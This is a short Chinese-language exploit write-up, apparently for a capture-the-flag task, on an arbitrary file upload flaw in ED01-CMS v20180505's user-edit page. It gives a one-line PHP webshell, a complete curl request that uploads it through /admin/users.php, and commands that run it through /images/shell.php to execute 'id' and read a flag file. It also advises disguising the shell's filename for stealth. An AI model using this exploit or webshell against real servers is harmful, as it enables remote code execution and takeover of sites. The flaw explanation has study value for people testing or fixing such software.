验证漏洞存在方法
    - 上传PHP WebShell到目标服务器的/images/目录
    - 访问上传的WebShell执行命令验证远程代码执行

漏洞利用方法
    - ED01-CMS v20180505 的用户编辑功能存在任意文件上传漏洞。位于 /admin/users.php?source=edit_user&id=1 的编辑用户流程会在服务端直接采用上传文件原名，并将文件移动到站点可访问的 /images/ 目录下。代码仅在前端表单中限制 image/*，服务端未校验扩展名、MIME 类型或文件内容，也未阻止将脚本文件写入 Web 根目录可访问位置，因此攻击者可上传 PHP WebShell，随后直接通过 /images/ 路径访问并执行，实现远程代码执行。
    - 示例 WebShell 代码：<?php system($_GET['cmd']); ?>。示例利用请求可写为：curl -i -X POST 'http://TARGET/admin/users.php?source=edit_user&id=1' -F 'user_id=1' -F 'user_uname=admin' -F 'user_email=attacker@example.com' -F 'user_pass1=Passw0rd!' -F 'user_pass2=Passw0rd!' -F 'user_fname=Admin' -F 'user_lname=User' -F 'user_role=Administrator' -F 'user_status=Active' -F 'user_image=new' -F 'updateusersubmit=1' -F 'new_image=@shell.php;type=application/x-php'。随后访问：curl 'http://TARGET/images/shell.php?cmd=id'；如需读取题目文件可访问：curl 'http://TARGET/images/shell.php?cmd=cat+/tmp/flag.txt'。如果需要更隐蔽，可把文件名伪装成 avatar.php 或 a.php，并维持表单中的其它字段为合法值以保证更新逻辑顺利通过。
